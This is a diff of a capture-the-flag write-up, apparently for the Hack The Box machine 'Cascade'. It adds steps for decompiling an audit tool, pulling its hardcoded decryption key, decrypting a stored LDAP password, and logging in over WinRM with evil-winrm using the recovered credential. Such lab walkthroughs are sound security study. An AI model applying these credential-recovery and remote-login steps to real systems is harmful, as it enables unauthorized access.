@@ -636,16 +636,19 @@ root@kali:~# echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
 ������D�|zC�;
 ```
 
-Next, take a look at `RunAudit.bat`.
+Next, take a look at `RunAudit.bat`.<br>
+IT runs `CascAudit.exe` with the argument `\\CASC-DC1\Audit$\DB\Audit.db`.
 ```shell
 root@kali:~# cat 10.10.10.182-Audit_RunAudit.bat 
 CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
 ```
 
+Since we do not have the source code for `CascAudit.exe`, decompile it with [dnSpy](https://github.com/0xd4d/dnSpy).<br>
+First, spin up Windows VM, launch `dnSpy` and open the `CascAudit.exe`.
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-31/cascade.png)
 
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-31/cascade.png)
 
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-31/cascade.png)
 ```shell
 namespace CascAudiot
 {
@@ -777,6 +780,8 @@ namespace CascAudiot
 }
 ```
 
+Following is the important section.<br>
+It is getting the encrypted password from SQLite database and decrypting with the key `c4scadek3y654321`.
 ```shell
 					sqliteConnection.Open();
 						using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
@@ -801,9 +806,9 @@ namespace CascAudiot
 						sqliteConnection.Close();
 ```
 
+However, `CascAudit.exe` does not have the definition of `Crypto.DecryptString()`.<br>
+Then, take a look at `CascCrypto.dll`. We can find the function defined.
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-31/cascade.png)
-
-
 ```shell
 public static string DecryptString(string EncryptedString, string Key)
 		{
@@ -828,7 +833,8 @@ public static string DecryptString(string EncryptedString, string Key)
 		}
 ```
 
-
+To get the password to log in, we have to write a .NET code
+Actually, if we google, we can find someone's left the code here [https://dotnetfiddle.net/2RDoWz](https://dotnetfiddle.net/2RDoWz).
 ```shell
 using System;
 using System.IO;
@@ -866,13 +872,8 @@ public class Program
 }
 ```
 
-https://dotnetfiddle.net/2RDoWz
-
-```shell
-w3lc0meFr31nd
-```
-
-Then, try to log in with the credential `a`
+`w3lc0meFr31nd` is the password we can get by running this .NET code.<br>
+Then, try to log in with the credential `ArkSvc:w3lc0meFr31nd`.
 ```shell
 root@kali:~/evil-winrm# ./evil-winrm.rb -u ArkSvc -p 'w3lc0meFr31nd' -i 10.10.10.182
 
